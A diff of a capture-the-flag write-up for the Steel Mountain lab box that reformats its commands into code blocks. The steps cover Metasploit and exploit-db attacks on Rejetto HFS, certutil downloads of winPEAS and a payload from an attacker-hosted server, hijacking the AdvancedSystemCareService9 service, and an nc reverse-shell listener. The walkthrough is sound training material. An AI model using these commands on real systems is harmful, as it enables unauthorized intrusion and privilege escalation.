@@ -29,7 +29,11 @@ set LHOST <local IP>
 We can leave the LPORT to 4444
 And finally hit `run` or `exploit`.
 ![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
-And...We're in! `getuid` `STEELMOUNTAIN\bill`
+And...We're in! 
+```
+getuid:
+STEELMOUNTAIN\bill
+```
 
 Now we will use the `upload` functionality of meterpreter to upload `PowerUp.ps1` in the `%TEMP%` folder:
 ![](https://github.com/user-attachments/assets/928397a9-fd95-4ee7-a4a5-ec8a8f4c544c)
@@ -63,10 +67,15 @@ The service will probably crash but we will have triggered our payload. We are n
 Now we will redo all the phases of this box without automatic exploitation.
 
 We will begin by searching for an exploit in the exploitdb:
-`searchploit rejetto`
+```
+searchploit rejetto
+```
 ![](https://github.com/user-attachments/assets/c78ac923-a65a-4b91-a7d7-acaff97ef817)
 
-We will use the 39161.py one. Let's download it: `searchsploit -p windows/remote/39161.py`
+We will use the 39161.py one. Let's download it:
+```
+searchsploit -p windows/remote/39161.py
+```
 ![](https://github.com/user-attachments/assets/f95e68c9-9f97-4865-b832-184ec411b25c)
 In the exploit we only need to change the IP and the LPORT to make it work.
 
@@ -82,22 +91,34 @@ Second run:
 ![](https://github.com/user-attachments/assets/f1ca4ff2-63b1-4b8f-ac92-5cb07ad0a277)
 
 Now that we're in, we will upload `winpeas` to do some enumeration:
-We will again open a server hosting the file and use `certutil` to download it: `certutil -f -split -urlcache http://xx.xx.xx.xx:<PORT>/winPEASany.exe winPEAS.exe`
+We will again open a server hosting the file and use `certutil` to download it:
+```
+certutil -f -split -urlcache http://xx.xx.xx.xx:<PORT>/winPEASany.exe winPEAS.exe
+```
 ![](https://github.com/user-attachments/assets/7c432bc9-ffba-4a47-9314-d996eb3d1f1d)
 
 Now it's time to fire it up:
-`.\winPEAS.exe servicesinfo`
+```
+.\winPEAS.exe servicesinfo
+```
 ![](https://github.com/user-attachments/assets/d8a33f37-e2da-4b5c-9fea-c98b3047c7b1)
 And as predicted, winpeas found our ASC privesc vuln.
 
-Now we will use `certutil` again to download and substitute the original ASCService.exe with our payload, after we have stopped the service: `sc stop AdvancedSystemCareService9`
+Now we will use `certutil` again to download and substitute the original ASCService.exe with our payload, after we have stopped the service:
+```
+sc stop AdvancedSystemCareService9
+```
 ![](https://github.com/user-attachments/assets/1fd7e1ac-05a2-4f1d-ad3a-4db7a64d9a0d)
 
-`certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe`
+```
+certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe
+```
 ![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)
 
 In another terminal, fire up `nc -lvnp <PORT>` and finally, by restarting the service we will own our root shell. 
-`sc start AdvancedSystemCareService9`
+```
+sc start AdvancedSystemCareService9
+```
 ![](https://github.com/user-attachments/assets/2137f4d2-deaf-4dc7-aff2-679940aca053)
 
 ![](https://github.com/user-attachments/assets/5bfb89be-31aa-485c-a284-d536c751b012)
